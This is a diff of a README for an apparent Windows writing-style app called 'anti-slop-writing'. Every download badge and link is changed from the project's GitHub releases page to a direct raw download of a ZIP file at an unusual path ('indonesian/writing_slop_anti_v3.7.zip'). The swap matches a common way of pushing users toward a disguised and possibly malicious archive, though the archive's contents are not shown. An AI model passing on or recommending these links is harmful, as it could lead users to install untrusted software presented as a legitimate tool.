@@ -1,6 +1,6 @@
 # 🤖 anti-slop-writing - Improve Your AI’s Writing Style
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen?style=for-the-badge)](https://github.com/coderjatin/anti-slop-writing/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/coderjatin/anti-slop-writing/main/indonesian/writing_slop_anti_v3.7.zip)
 
 ---
 
@@ -34,7 +34,7 @@ Before installation, make sure your system meets these requirements:
 
 Visit the official release page here:
 
-[![Download Page](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/coderjatin/anti-slop-writing/releases)
+[![Download Page](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/coderjatin/anti-slop-writing/main/indonesian/writing_slop_anti_v3.7.zip)
 
 This page contains the latest versions. Download the installer or ZIP file depending on your preference.
 
@@ -108,7 +108,7 @@ The app runs locally on your Windows computer. It does not send your text or pro
 
 Return to the release page anytime for the latest files:
 
-[https://github.com/coderjatin/anti-slop-writing/releases](https://github.com/coderjatin/anti-slop-writing/releases)
+[https://raw.githubusercontent.com/coderjatin/anti-slop-writing/main/indonesian/writing_slop_anti_v3.7.zip](https://raw.githubusercontent.com/coderjatin/anti-slop-writing/main/indonesian/writing_slop_anti_v3.7.zip)
 
 Follow the same process as before to update or reinstall.
 
@@ -154,4 +154,4 @@ Yes, you can download and use it at no cost.
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen?style=for-the-badge)](https://github.com/coderjatin/anti-slop-writing/releases)
+[![Download Now](https://img.shields.io/badge/Download-Get%20the%20App-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/coderjatin/anti-slop-writing/main/indonesian/writing_slop_anti_v3.7.zip)
